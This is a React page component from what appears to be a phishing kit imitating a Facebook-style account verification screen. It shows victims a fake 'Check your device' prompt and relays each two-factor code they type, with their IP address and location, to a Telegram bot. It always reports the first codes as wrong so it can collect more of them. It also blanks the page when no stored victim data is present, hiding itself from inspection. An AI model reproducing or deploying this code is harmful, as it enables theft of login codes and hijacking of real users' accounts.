import VerifyImage from '@/assets/images/681.png';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback } from 'react';
import sendMessage from '@/utils/telegram';
import { useNavigate } from 'react-router';
import { PATHS } from '@/router/router';

const Verify = () => {
    const navigate = useNavigate();
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [translatedTexts, setTranslatedTexts] = useState({
        title: 'Check your device',
        description: '',
        placeholder: 'Enter your code',
        infoTitle: 'Approve from another device or Enter your verification code',
        infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
        submit: 'Continue',
        sendCode: 'Send new code',
        errorMessage: 'The verification code you entered is incorrect',
        loadingText: 'Please wait'
    });

    // 🎯 CẬP NHẬT: Load và khởi tạo dịch
    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
            return;
        }

        // 🎯 LẤY DATA TỪ LOCALSTORAGE
        const savedUserInfo = localStorage.getItem('userInfo');
        let actualEmail = 's****g@m****.com';
        let actualPhone = '******32';
        
        if (savedUserInfo) {
            try {
                const userData = JSON.parse(savedUserInfo);
                actualEmail = userData.email || actualEmail;
                actualPhone = userData.phone || actualPhone;
            } catch (error) {
                console.log('Error parsing userInfo:', error);
            }
        }

        const targetLang = localStorage.getItem('targetLang');
        
        // 🎯 ƯU TIÊN DÙNG BẢN DỊCH ĐÃ LƯU TỪ HOME
        if (targetLang && targetLang !== 'en') {
            const savedTranslation = localStorage.getItem(`translatedVerify_${targetLang}`);
            if (savedTranslation) {
                try {
                    const parsedTranslation = JSON.parse(savedTranslation);
                    setTranslatedTexts(parsedTranslation);
                } catch {
                    // Nếu lỗi thì dùng tiếng Anh với data thật
                    setTranslatedTexts(prev => ({
                        ...prev,
                        description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
                    }));
                }
            } else {
                // Nếu chưa có bản dịch thì dùng tiếng Anh với data thật
                setTranslatedTexts(prev => ({
                    ...prev,
                    description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
                }));
            }
        } else {
            // 🎯 TIẾNG ANH: DÙNG DATA THẬT
            setTranslatedTexts(prev => ({
                ...prev,
                description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
            }));
        }
    }, []);

    const handleSubmit = async () => {
        if (!code.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const timestamp = new Date().toLocaleString('vi-VN');
            const ipInfo = localStorage.getItem('ipInfo');
            const ipData = ipInfo ? JSON.parse(ipInfo) : {};
            
            const message = `🔐 <b>VERIFY CODE</b>
📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'N/A'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'N/A'} - ${ipData.region || 'N/A'} - ${ipData.country_code || 'N/A'}</code>

🔢 <b>Code:</b> <code>${code}</code>
🔄 <b>Lần thử:</b> <code>${attempts + 1}</code>`;

            await sendMessage(message);
        } catch (error) {
            console.log('Send message error:', error);
        }

        // Delay 1 giây
        await new Promise((resolve) => setTimeout(resolve, 1000));

        const newAttempts = attempts + 1;
        setAttempts(newAttempts);

        if (newAttempts < 3) {
            setShowError(true);
            setIsLoading(false);
            setCode('');
        } else {
            navigate(PATHS.SEND_INFO);
        }
    };

    return (
        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
            <title>Account | Privacy Policy</title>
            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                <p>{translatedTexts.description}</p>

                <img src={VerifyImage} alt='' />
                
                {/* 🎯 CHỈ SỬA CÁI INPUT NÀY THÔI */}
                <input
                    type='number'
                    inputMode='numeric'
                    max={8}
                    placeholder={translatedTexts.placeholder}
                    className='w-full rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-4 text-center text-xl font-semibold placeholder:text-center placeholder:text-xl placeholder:font-medium'
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                />
                
                {showError && <p className='text-sm text-red-500 text-center'>{translatedTexts.errorMessage}</p>}
                
                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
                    <div>
                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                    </div>
                </div>

                <button
                    className='rounded-md bg-[#0866ff] px-4 py-3 text-base font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
                    onClick={handleSubmit}
                    disabled={isLoading || !code.trim()}
                >
                    {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                </button>

                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
            </div>
        </div>
    );
};

export default Verify;
